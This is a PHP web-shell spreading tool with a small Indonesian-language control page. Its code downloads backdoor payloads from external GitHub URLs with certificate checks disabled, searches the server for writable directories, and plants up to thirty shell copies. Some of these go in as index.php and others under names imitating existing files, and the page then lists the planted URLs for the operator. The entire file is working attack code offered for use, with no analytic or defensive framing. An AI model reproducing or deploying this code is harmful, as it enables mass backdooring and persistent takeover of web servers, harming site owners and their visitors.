<?php
error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

$shell_urls = [
    "https://raw.githubusercontent.com/Slotberlin/tebar/refs/heads/main/adminsange.txt",
    "https://raw.githubusercontent.com/Slotberlin/tebar/refs/heads/main/ikanteri.txt",
    "https://raw.githubusercontent.com/Slotberlin/tebar/refs/heads/main/f023.txt",
    "https://raw.githubusercontent.com/Slotberlin/tebar/refs/heads/main/wp-adminmenu.txt",
    "https://raw.githubusercontent.com/Slotberlin/tebar/refs/heads/main/seoikanteri.txt"
];

$total_shells = 30;
$index_shells = 4;
$request_delay = 1;

$results = [];

if (isset($_POST['run'])) {
    function fetchContent($url) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 5],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        sleep(rand(1,2));
        $content = @file_get_contents($url, false, $ctx);
        if (!$content) return false;
        if (isset($http_response_header)) {
            foreach ($http_response_header as $header) {
                if (strpos($header, '500') !== false) return false;
            }
        }
        return $content;
    }

    $chosen_shells = [];
    for ($i = 0; $i < $total_shells; $i++) {
        $chosen_shells[] = $shell_urls[array_rand($shell_urls)];
    }

    $shell_contents = [];
    foreach (array_unique($chosen_shells) as $url) {
        $content = fetchContent($url);
        if ($content) {
            $shell_contents[$url] = $content;
            sleep($request_delay);
        }
    }

    function getWritableDirs($base, $max_depth = 3) {
        $dirs = [];
        $queue = [[$base, 0]];

        while (!empty($queue)) {
            list($current, $depth) = array_shift($queue);

            if ($depth > $max_depth) continue;

            $items = @scandir($current);
            if (!$items) continue;

            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;

                $path = $current . '/' . $item;

                if (is_dir($path)) {
                    if (is_writable($path)) {
                        $dirs[] = $path;
                    }
                    $queue[] = [$path, $depth + 1];
                }
            }
        }

        shuffle($dirs);
        return $dirs;
    }

    function generateFileName($dir) {
        $files = @array_filter(scandir($dir), function ($f) use ($dir) {
            return is_file($dir . DIRECTORY_SEPARATOR . $f);
        });

        if (empty($files)) {
            return 'default_' . rand(10, 99) . '.php';
        }

        $chosen = $files[array_rand($files)];
        $name = pathinfo($chosen, PATHINFO_FILENAME);

        return $name . '_' . rand(10, 99) . '.php';
    }

    function safeUpload($path, $content) {
        $methods = [
            function() use ($path, $content) {
                return @file_put_contents($path, $content) !== false;
            },
            function() use ($path, $content) {
                $fh = @fopen($path, 'w');
                if (!$fh) return false;
                $result = @fwrite($fh, $content);
                @fclose($fh);
                return $result !== false;
            },
            function() use ($path, $content) {
                $tmp = tempnam(sys_get_temp_dir(), 'tmp');
                if (!@file_put_contents($tmp, $content)) return false;
                $result = @copy($tmp, $path);
                @unlink($tmp);
                return $result;
            }
        ];
        shuffle($methods);

        foreach ($methods as $method) {
            if ($method()) {
                @chmod($path, 0644);
                return true;
            }
            sleep(1);
        }
        return false;
    }

    $base_dir = __DIR__;
    $dirs = getWritableDirs($base_dir);
    shuffle($dirs);

    $uploaded = 0;
    $index_uploaded = 0;

    foreach ($dirs as $dir) {
        if ($uploaded >= $total_shells) break;

        $shell_url = $chosen_shells[$uploaded] ?? null;
        $content = $shell_contents[$shell_url] ?? null;

        if (!$shell_url || !$content) continue;

        if ($index_uploaded < $index_shells && !file_exists($dir . '/index.php')) {
            $filename = 'index.php';
            $index_uploaded++;
        } else {
            $filename = generateFileName($dir);
        }

        $path = $dir . '/' . $filename;

        if (safeUpload($path, $content)) {
            $relative_path = str_replace($base_dir, '', $path);
            $url = ($_SERVER['REQUEST_SCHEME'] ?? 'http') . '://' . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $relative_path);
            $results[] = $url;
            $uploaded++;
            sleep($request_delay);
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>TEBAR SHELL BY SEOIKANTERI</title>
    <style>
        body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
        h2 { color: #f33; }
        textarea { width: 100%; height: 200px; background: #222; color: #0f0; border: none; padding: 10px; margin-bottom: 10px; }
        button { padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }
        button:hover { background: #444; }
    </style>
</head>
<body>
    <h2>TEBAR SHELL OTOMATIS</h2>
    <form method="post">
        <button type="submit" name="run">RUN</button>
    </form>

    <?php if (!empty($results)): ?>
    <h3>Hasil Tebar (<?= count($results) ?>)</h3>
    <textarea id="hasil"><?= implode("\n", $results) ?></textarea>
    <button onclick="copyText()">Copy All</button>
    <script>
        function copyText() {
            let area = document.getElementById("hasil");
            area.select();
            document.execCommand("copy");
            alert("Copied!");
        }
    </script>
    <?php endif; ?>
</body>
</html>